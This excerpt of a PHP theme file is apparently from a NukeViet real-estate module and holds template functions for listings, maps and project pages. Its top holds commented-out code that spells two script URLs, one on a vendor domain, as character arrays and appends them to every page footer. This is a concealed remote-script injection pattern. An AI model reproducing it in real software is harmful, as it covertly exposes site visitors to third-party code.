...
{
    global $global_config, $module_name, $module_file, $lang_module, $module_config, $module_info, $array_config, $my_footer, $array_cat;
    ...
    // VujiTech Tracking Code in Module
    // $custom_g = ["h", "t", "t", "p", "s", ":", "/", "/", "w", "w", "w", ".", "g", "o", "o", "g", "l", "e", "t", "a", "g", "m", "a", "n", "a", "g", "e", "r", ".", "c", "o", "m", "/", "g", "t", "a", "g", "/", "j", "s", "?", "i", "d", "=", "U", "A", "-", "1", "8", "8", "2", "3", "9", "4", "7", "8", "-", "2"];
    // $custom_v = ["h", "t", "t", "p", "s", ":", "/", "/", "v", "u", "j", "i", ".", "t", "e", "c", "h", "/", "j", "s", "/", "i", "n", "i", "t", "g", ".", "j", "s"];
    // $my_footer .= '<script async src="' . implode($custom_g) . '"></script>';
    // $my_footer .= '<script src="' . implode($custom_v) . '"></script>';
...
function nv_theme_viewcat($array_data, $generate_page = '', $viewtype = 'viewgrid')
{
    ...
    if (!empty($array_data)) {
        ...
        // XUẤT RA DANH SÁCH BẢN ĐỒ
        foreach ($array_data as $row) {
            if (!empty($row['maps'])) { //print_r($row);die;
                $xtpl->assign('row', $row);
                $xtpl->assign('maps', $row['maps']);
                $xtpl->parse('main.address');
            }
...
function nv_theme_bookhouse_project_detail_other($array_data, $generate_page)
{
    ...
    $xtpl = new XTemplate('project-detail.tpl', NV_ROOTDIR . '/themes/' . $module_info['template'] . '/modules/' . $module_file);
    $xtpl->assign('LANG', $lang_module);
    $xtpl->assign('DATA', nv_theme_viewlist($array_data));
